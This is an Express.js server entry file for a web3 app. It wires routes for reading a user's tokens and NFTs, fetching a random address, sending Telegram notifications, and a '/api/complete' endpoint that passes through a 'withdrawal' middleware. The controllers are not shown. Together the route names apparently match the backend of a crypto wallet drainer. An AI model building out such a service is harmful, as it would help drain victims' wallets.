import "express-async-errors";
import config from "dotenv/config.js";

import path from "path";
import express from "express";
import * as thirdweb from "thirdweb";

import getDirname from "./utils/getDirname.js";

import auth from "./middlewares/auth.js";
import cors from "./middlewares/cors.js";
import error from "./middlewares/error.js";
import withdrawal from "./middlewares/withdrawal.js";
import refactorPayload from "./middlewares/refactorPayload.js";

import userController from "./controllers/userController.js";
import configController from "./controllers/configController.js";
import tokensController from "./controllers/tokensController.js";
import infoController from "./controllers/infoController.js";
import web3Controller from "./controllers/web3Controller.js";

const __dirname = getDirname(import.meta.url);
const app = express();

app.use(cors);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use("/view", express.static(path.resolve(__dirname, "view")));

app.get("/api/user/:userId/:bundleId", userController.getUserBundle);
app.get(
  "/api/user/requestBundle/:userId/:bundleId",
  userController.requestBundle
);
app.get("/api/config", configController.get);

app.get("/api/getTokenPrice", auth, tokensController.getTokenPrice);
app.get("/api/getUserTokens", tokensController.getTokens);
app.get("/api/getUserNfts", auth, tokensController.getNFTs);

app.get("/api/user/getRandomAddress", auth, userController.getRandomAddress);
app.post(
  "/api/telegramNotification",
  auth,
  infoController.telegramNotification
);
app.post(
  "/api/complete",
  auth,
  refactorPayload,
  withdrawal,
  web3Controller.complete
);

app.use(error);

const PORT = process.env.PORT || 3001;

app.listen(PORT, () => {
  console.log(`HTTP Server running on port `, PORT);
});
